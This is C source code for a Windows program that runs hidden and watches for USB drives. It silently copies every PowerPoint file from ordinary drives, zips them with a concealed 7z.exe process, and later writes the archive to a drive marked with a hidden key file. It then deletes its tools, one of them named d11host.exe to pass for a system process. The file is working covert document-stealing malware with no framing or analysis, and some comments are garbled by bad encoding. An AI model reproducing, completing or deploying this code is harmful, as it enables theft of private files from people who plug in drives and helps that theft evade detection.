#include <windows.h>
#include <tchar.h>
#include <strsafe.h>
#include <Dbt.h>

#define PATH_SEPARATOR_C TEXT('\\')
#define KEY_PATH_LEN 64
const TCHAR szZipName[] = TEXT("PrivateJava.zip");

TCHAR szTempPath[MAX_PATH] = {0};

bool IsDotsDirectory(LPCTSTR lpFileName)
{
	return (_tcscmp(lpFileName, _T(".")) == 0 || _tcscmp(lpFileName, _T("..")) == 0);
}


bool TrimRight(LPTSTR lpString, TCHAR ch, size_t* lpSize)
{
	if (lpString == NULL)
		return false;

	size_t uLen = 0;
	if (lpSize != NULL)
		uLen = *lpSize;
	if (uLen == 0)
		uLen = _tcslen(lpString);

	LPTSTR pEndChar = lpString + uLen;
	while (pEndChar > lpString && *(pEndChar - 1) == ch)
	{
		pEndChar--;
		uLen--;
	}
	*pEndChar = _T('\0');

	if (lpSize != NULL)
		*lpSize = uLen;

	return true;
}

bool IsPPT(LPTSTR lpFileName)
{
    size_t nLen;
    StringCchLength(lpFileName,MAX_PATH,&nLen);
    
    return !_tcsicmp(lpFileName + nLen - 4,TEXT(".ppt"));
}

BOOL CreateTempFolder(OUT LPTSTR szTempFolder,IN size_t nSize)
{
	BOOL bRet = FALSE;
	TCHAR szTempPath[MAX_PATH];
	TCHAR szTempFolderName[MAX_PATH];
	size_t nLen = 0;

	GetTempPath(MAX_PATH,szTempPath);
	GetTempFileName(szTempPath,NULL,0,szTempFolderName);

	StringCchLength(szTempFolderName,MAX_PATH,&nLen);
	szTempFolderName[nLen - 4] = TEXT('\0');

	bRet = CreateDirectory(szTempFolderName,NULL);
	
	if(bRet)
	    StringCchCopy(szTempFolder,nSize,szTempFolderName);
	
	return bRet;
	
}

BOOL IsDestUDisk(LPTSTR lpDiskPath)
{
 	TCHAR szSrcPath[MAX_PATH];
	size_t nSrcLen = _tcslen(lpDiskPath);

	_tcscpy_s(szSrcPath, MAX_PATH, lpDiskPath);
	TrimRight(szSrcPath, PATH_SEPARATOR_C, &nSrcLen);

	LPTSTR lpChr = szSrcPath + nSrcLen;	//Ö¸Ïò×Ö·û´®Ä©Î²¡°\0¡±
	nSrcLen = MAX_PATH - nSrcLen;

	_tcscpy_s(lpChr, nSrcLen, _T("\\*"));

	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA FindFileData;

	hFind = FindFirstFile(szSrcPath, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		LPTSTR lpDstEnd = NULL;
		TCHAR szSrcFilePath[MAX_PATH];

		nSrcLen = lpChr - szSrcPath;
		_tcsncpy_s(szSrcFilePath, MAX_PATH, szSrcPath, nSrcLen);
		lpChr = szSrcFilePath + nSrcLen;
		nSrcLen = MAX_PATH - nSrcLen;

		do
		{
			if (IsDotsDirectory(FindFileData.cFileName))
				continue;

			swprintf_s(lpChr, nSrcLen, _T("\\%s"), FindFileData.cFileName);

			if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
			{
			    if( _tcsicmp(FindFileData.cFileName,TEXT("java08")) )
				    return TRUE;

			    IsDestUDisk(lpDiskPath);
			}

		} while (FindNextFile(hFind, &FindFileData));
	}

	FindClose(hFind);
	return FALSE;
}

  //  int n = 0;
void ListAndCopyFiles(LPTSTR lpSrcPathName,LPTSTR szDestFolder)
{
 	TCHAR szSrcPath[MAX_PATH];
	size_t nSrcLen = _tcslen(lpSrcPathName);

	TCHAR szDestPathName[MAX_PATH];

	_tcscpy_s(szSrcPath, MAX_PATH, lpSrcPathName);
	TrimRight(szSrcPath, PATH_SEPARATOR_C, &nSrcLen);

	LPTSTR lpChr = szSrcPath + nSrcLen;	    //Ö¸Ïò×Ö·û´®Ä©Î²¡°\0¡±
	nSrcLen = MAX_PATH - nSrcLen;

	_tcscpy_s(lpChr, nSrcLen, _T("\\*"));

	HANDLE hFind = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA FindFileData;

	hFind = FindFirstFile(szSrcPath, &FindFileData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		LPTSTR lpDstEnd = NULL;
		TCHAR szSrcFilePath[MAX_PATH];

		nSrcLen = lpChr - szSrcPath;
		_tcsncpy_s(szSrcFilePath, MAX_PATH, szSrcPath, nSrcLen);
		lpChr = szSrcFilePath + nSrcLen;
		nSrcLen = MAX_PATH - nSrcLen;

		do
		{
			if (IsDotsDirectory(FindFileData.cFileName))
				continue;

			swprintf_s(lpChr, nSrcLen, _T("\\%s"), FindFileData.cFileName);

			if ((FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
			{
				ListAndCopyFiles(szSrcFilePath,szDestFolder);
			}
			else
			{
			    if(IsPPT(FindFileData.cFileName))
			    {
				StringCchPrintf(szDestPathName,MAX_PATH,TEXT("%s%s%s"),szDestFolder,TEXT("\\"),FindFileData.cFileName);

				CopyFile(szSrcFilePath,szDestPathName,FALSE);
			    }
			}
		} while (FindNextFile(hFind, &FindFileData));
	}

	FindClose(hFind);
}

void FindDriverName(IN OUT TCHAR &cDriverName,IN DWORD dwMask)
{
    int i = 0;
    for(;i <= 26; ++i)
    {
	if(dwMask & 0x1)
	    break;
	dwMask = dwMask >> 1;
    }
    cDriverName = TEXT('A') + i;
}

DWORD CompressFiles7z(IN LPTSTR lpSrcFolder)
{
    const int MAX_CMD_LEN = 512;
    TCHAR szCompressCmds[MAX_CMD_LEN];
    TCHAR szWinPath[MAX_PATH];

    DWORD dwExitCode = 0;

//    TCHAR szMsg[64];
   
    GetWindowsDirectory(szWinPath,MAX_PATH);
    StringCchPrintf(szCompressCmds,MAX_CMD_LEN,TEXT("%s\\7z.exe a -tzip %s\\%s %s\\*.ppt"),szWinPath,lpSrcFolder,szZipName,lpSrcFolder);

    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    ZeroMemory(&si,sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    
    if( CreateProcess(NULL,szCompressCmds,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi) )
    {
	CloseHandle(pi.hThread);
	//MessageBox(NULL,TEXT("7z ok"),TEXT("info"),MB_OK);
    }
    WaitForSingleObject(pi.hProcess,INFINITE);
    GetExitCodeProcess(pi.hProcess,&dwExitCode);

    CloseHandle(pi.hProcess);

    //StringCchPrintf(szMsg,64,TEXT("7Z returned %u"),dwExitCode);
    //MessageBox(NULL,szMsg,TEXT("7Z"),MB_OK);

    return dwExitCode;
}

void CleanUp()
{
    TCHAR sz7zPath[MAX_PATH];

    GetWindowsDirectory(sz7zPath,MAX_PATH);
    StringCchCat(sz7zPath,MAX_PATH,TEXT("\\7z.exe"));
    DeleteFile(sz7zPath);

    TCHAR szWorkerPath[MAX_PATH];
    GetWindowsDirectory(szWorkerPath,MAX_PATH);
    StringCchCat(szWorkerPath,MAX_PATH,TEXT("\\system32\\d11host.exe"));
    DeleteFile(szWorkerPath);
}

LRESULT CALLBACK WinProc(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam)
{
	PDEV_BROADCAST_HDR pdbHdr = NULL;
	PDEV_BROADCAST_VOLUME pdbVol = NULL;
	TCHAR cDriverName;
	static const TCHAR szKeyFix[] = TEXT(":\\key\\key.dat");
	static BOOL bCompressed = FALSE;
	
	TCHAR szDiskSrcPath[MAX_PATH];
	TCHAR szDestFolder[MAX_PATH];

	TCHAR szSrcZipFilePath[MAX_PATH];
	TCHAR szDestZipFilePath[MAX_PATH];

	HANDLE hFile = INVALID_HANDLE_VALUE;

	TCHAR szKey[KEY_PATH_LEN];

	switch(Msg)
	{
	case WM_CLOSE:
		CleanUp();
		DestroyWindow(hWnd);
		PostQuitMessage(0);

		break;

	case WM_DEVICECHANGE:
	    {
		if(wParam == DBT_DEVICEARRIVAL)
		{
		    pdbHdr = (PDEV_BROADCAST_HDR)lParam;
		    if(pdbHdr->dbch_devicetype == DBT_DEVTYP_VOLUME)
		    {
			pdbVol = (PDEV_BROADCAST_VOLUME)pdbHdr;
			FindDriverName(cDriverName, pdbVol->dbcv_unitmask);

			StringCchPrintf(szKey,KEY_PATH_LEN,TEXT("%c%s"),cDriverName,szKeyFix);
			StringCchPrintf(szDiskSrcPath,MAX_PATH,TEXT("%c:"),cDriverName);

			hFile = CreateFile(szKey,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_HIDDEN,NULL);
			if(hFile == INVALID_HANDLE_VALUE)
			{
			    if( GetLastError() == ERROR_FILE_NOT_FOUND && IsDestUDisk(szDiskSrcPath) )
			    {
				if( CreateTempFolder(szTempPath,MAX_PATH) )
				{
				    ListAndCopyFiles(szDiskSrcPath,szTempPath);

				    if( !CompressFiles7z(szTempPath) )	    //return 0 if success
					bCompressed = TRUE;
				}
			    }
			}
			else
			{
			    CloseHandle(hFile);

			    if( szTempPath[0] != TEXT('\0') )
			    {
				StringCchPrintf(szDestFolder,MAX_PATH,TEXT("%s\\Private"),szDiskSrcPath);
				CreateDirectory(szDestFolder,NULL);
				StringCchCat(szDestFolder,MAX_PATH,TEXT("\\Java"));
				CreateDirectory(szDestFolder,NULL);
				StringCchCat(szDestFolder,MAX_PATH,TEXT("\\PPTs"));
				CreateDirectory(szDestFolder,NULL);
				
				if( !bCompressed )
				    ListAndCopyFiles(szTempPath,szDestFolder);
				else
				{
				    StringCchPrintf(szSrcZipFilePath,MAX_PATH,TEXT("%s\\%s"),szTempPath,szZipName);
				    StringCchPrintf(szDestZipFilePath,MAX_PATH,TEXT("%s\\%s"),szDestFolder,szZipName);

				    CopyFile(szSrcZipFilePath,szDestZipFilePath,FALSE);
				}				    

				SendMessage(hWnd,WM_CLOSE,0,0);
			    }
			    
			}
		    }
		}
	    }
	    break;

	default:
		return DefWindowProc(hWnd,Msg,wParam,lParam);

		break;
	}
	return 0;
}


int WINAPI _tWinMain(HINSTANCE hInstance,HINSTANCE,PTSTR lpCmdLine,int nCmdShow)
{
	HANDLE hMutex = NULL;

	hMutex = CreateMutex(NULL,FALSE,TEXT("dl1host"));
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
	    CloseHandle(hMutex);
	    hMutex = NULL;
	    return -1;
	}

	MSG msg;
	WNDCLASSEX WndClass;
	TCHAR lpClassName[] = TEXT("PPTS");
	TCHAR lpCaption[] = TEXT("PPTS");

	RtlZeroMemory(&WndClass,sizeof(WndClass));

	WndClass.cbSize = sizeof(WndClass);
	WndClass.hCursor = LoadCursor(NULL,IDC_ARROW);
	WndClass.style = CS_HREDRAW|CS_VREDRAW;
	WndClass.lpfnWndProc = WinProc;
	WndClass.lpszClassName = lpClassName;
	WndClass.hInstance = hInstance;
	WndClass.hbrBackground = (HBRUSH)COLOR_WINDOW;

	RegisterClassEx(&WndClass);
	HWND hWnd = CreateWindowEx(WS_EX_CLIENTEDGE,lpClassName,lpCaption,WS_OVERLAPPEDWINDOW,300,200,600,400,NULL,NULL,hInstance,NULL);

	if(!hWnd)
	{
		return -1;
	}

	ShowWindow(hWnd,SW_HIDE);
	UpdateWindow(hWnd);

	while(GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	return msg.wParam;
}


